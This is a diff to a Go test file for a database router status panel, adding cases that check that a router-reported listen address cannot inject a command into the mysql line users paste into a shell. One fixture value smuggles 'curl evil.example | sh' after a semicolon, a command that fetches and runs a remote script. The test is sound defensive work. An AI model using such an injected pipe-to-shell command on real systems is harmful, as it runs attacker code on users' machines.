@@ -41,6 +41,16 @@ func TestRouterPanelSwitch(t *testing.T) {
 	numbers.Configured, numbers.URL, numbers.ReadAt = true, "http://router:9091/status", "2026-10-11T14:31:00Z"
 	numbers.Status = &RouterStatusDoc{Version: 1, Listen: "0.0.0.0:3399", ReadOnly: true, CostThreshold: 10000,
 		RouterNumbers: RouterNumbers{Servers: map[string]RouterServerNumbers{"a": {MySQL: 9, Copy: 4, Reasons: map[string]uint64{}}}}}
+	// A router's answer is another process's word: what it says its
+	// address is must not reach the command people paste into a shell.
+	hostile := numbers
+	hostileDoc := *numbers.Status
+	hostileDoc.Listen = "0.0.0.0:3310; curl evil.example | sh #"
+	hostile.Status = &hostileDoc
+	odd := numbers
+	oddDoc := *numbers.Status
+	oddDoc.Listen = "0.0.0.0:99999"
+	odd.Status = &oddDoc
 	token := routerViewDTO{Access: &routerAccessDTO{Token: true, Refusal: "DBTrail was started with an access token"}}
 	refused := routerViewDTO{Access: &routerAccessDTO{Refusal: "the router's settings file could not be read, so it is not changed: yaml: line 1"}}
 
@@ -49,7 +59,7 @@ const screen = new FakeEl("main");
 document.getElementById = (id) => (id === "view" ? screen : new FakeEl("div"));
 const flat = (n, out = []) => { if (n == null) return out; if (typeof n === "string") { out.push(n); return out; }
   if (n.nodeType === 3) { out.push(n.textContent); return out; } if (n._text) out.push(n._text); for (const c of n.children || []) flat(c, out); return out; };
-const V = { off: ` + enc(off) + `, offHad: ` + enc(offHadPassword) + `, on: ` + enc(on) + `, numbers: ` + enc(numbers) + `, token: ` + enc(token) + `, refused: ` + enc(refused) + ` };
+const V = { off: ` + enc(off) + `, offHad: ` + enc(offHadPassword) + `, on: ` + enc(on) + `, numbers: ` + enc(numbers) + `, token: ` + enc(token) + `, refused: ` + enc(refused) + `, hostile: ` + enc(hostile) + `, odd: ` + enc(odd) + ` };
 const servers = [{ id: "a", name: "shop", kind: "registry" }];
 let router = null, sent = [], change = null, toasts = [], confirms = [], sayYes = true;
 ctx.__api = async (path, o) => {
@@ -128,6 +138,8 @@ const withPw = (v, pw) => Object.assign(JSON.parse(JSON.stringify(v)), { passwor
   await press("Refresh", null);
   out.refreshFailed = see();
 
+  await open(V.hostile); out.hostile = see();
+  await open(V.odd); out.odd = see();
   await open(V.token); out.token = see();
   await open(V.refused); out.refused = see();
   await open(V.on, { "settings:write": false }); out.readOnly = see();
@@ -152,6 +164,7 @@ const withPw = (v, pw) => Object.assign(JSON.parse(JSON.stringify(v)), { passwor
 		PressedOn, PressedNew, PressedOff                    bool
 		Off, On, Declined, Replaced, FailedChange, TurnedOff seen
 		Later, NoServer, Numbers, Refreshed, RefreshFailed   seen
+		Hostile, Odd                                         seen
 		Token, Refused, ReadOnly, None                       seen
 	}
 	if err := json.Unmarshal(raw, &got); err != nil {
@@ -239,6 +252,12 @@ const withPw = (v, pw) => Object.assign(JSON.parse(JSON.stringify(v)), { passwor
 	has("a failed Refresh after a password was shown", got.RefreshFailed, "brp_kept", "could not ask this DBTrail")
 	hasNot("a failed Refresh", got.RefreshFailed, "9 by MySQL")
 
+	for name, s := range map[string]seen{"an address that carries a command": got.Hostile, "a port that is no port": got.Odd} {
+		has(name, s, "mysql -h 127.0.0.1 -P 3310 -u shop -p", "port 3310, the router's unless it was started with another")
+		if strings.Contains(s.Text, "curl") && strings.Contains(s.Text, "mysql -h 127.0.0.1 -P 3310; curl") || strings.Contains(s.Text, "-P 99999") {
+			t.Errorf("%s reached the command to paste: %s", name, s.Text)
+		}
+	}
 	has("started with a token", got.Token, "started with an access token", "the token is the password")
 	buttons("started with a token", got.Token, "")
 	has("a setting that cannot be changed", got.Refused, "cannot be changed here:", "could not be read")
